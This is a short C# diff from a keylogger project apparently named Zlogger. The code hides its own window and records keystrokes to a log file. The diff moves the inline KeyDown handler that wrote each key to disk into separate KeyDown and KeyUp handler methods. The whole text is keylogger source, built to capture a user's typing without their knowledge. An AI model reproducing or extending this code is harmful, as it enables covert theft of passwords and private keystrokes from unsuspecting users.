@@ -25,14 +25,8 @@ namespace Rodjenihm.Zlogger
             User32.ShowWindow(handle, (int)WindowState.SW_HIDE);
             using (var keylogger = new Keylogger(logPath))
             {
-                keylogger.KeyDown += (sender, e) =>
-                {
-                    using (var sw = new StreamWriter(keylogger.LogPath, true))
-                    {
-                        sw.Write((Keys)e.VkCode);
-                    }
-                };
-
+                keylogger.KeyDown += KeyloggerEventHandler.HandleKeyDown;
+                keylogger.KeyUp += KeyloggerEventHandler.HandleKeyUp;
                 keylogger.Run();
                 Application.Run();
             }
